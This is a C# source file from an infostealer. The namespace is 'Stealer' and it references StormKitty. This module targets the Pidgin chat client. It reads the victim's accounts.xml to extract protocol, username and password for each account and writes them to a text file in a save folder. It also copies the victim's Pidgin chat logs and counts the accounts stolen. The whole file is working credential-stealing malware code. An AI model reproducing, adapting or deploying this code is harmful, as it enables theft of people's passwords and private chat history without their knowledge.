using System;
using System.IO;
using System.Xml;
using System.Text;

namespace Stealer
{
    internal sealed class Pidgin
    {
        private static StringBuilder SBTwo = new StringBuilder();
        private static readonly string PidginPath = Path.Combine(Paths.appdata, ".purple");

        private static void GetLogs(string sSavePath)
        {
            try
            {
                string logs = Path.Combine(PidginPath, "logs");
                if (!Directory.Exists(logs)) return;
                StormKitty.Filemanager.CopyDirectory(logs, sSavePath + "\\chatlogs");
            }
            catch (Exception ex) { StormKitty.Logging.Log("Pidgin >> Failed to collect chat logs\n" + ex); }
        }

        private static void GetAccounts(string sSavePath)
        {
            string accounts = Path.Combine(PidginPath, "accounts.xml");
            if (!File.Exists(accounts)) return;

            try
            {
                XmlDocument xml = new XmlDocument();
                xml.Load(new XmlTextReader(accounts));

                foreach (XmlNode nl in xml.DocumentElement.ChildNodes)
                {
                    var Protocol = nl.ChildNodes[0].InnerText;
                    var Login = nl.ChildNodes[1].InnerText;
                    var Password = nl.ChildNodes[2].InnerText;

                    if (!string.IsNullOrEmpty(Protocol) && !string.IsNullOrEmpty(Login) && !string.IsNullOrEmpty(Password))
                    {
                        SBTwo.AppendLine($"Protocol: {Protocol}");
                        SBTwo.AppendLine($"Username: {Login}");
                        SBTwo.AppendLine($"Password: {Password}\r\n");

                        Counter.Pidgin++;
                    }
                    else
                        break;
                            
                }
                if (SBTwo.Length > 0)
                {
                        Directory.CreateDirectory(sSavePath);
                        File.AppendAllText(sSavePath + "\\accounts.txt", SBTwo.ToString());
                }
            }
            catch (Exception ex) { StormKitty.Logging.Log("Pidgin >> Failed to collect accounts\n" + ex); }
        }

        public static void Get(string sSavePath)
        {
            GetAccounts(sSavePath);
            GetLogs(sSavePath);
        }

    }
}
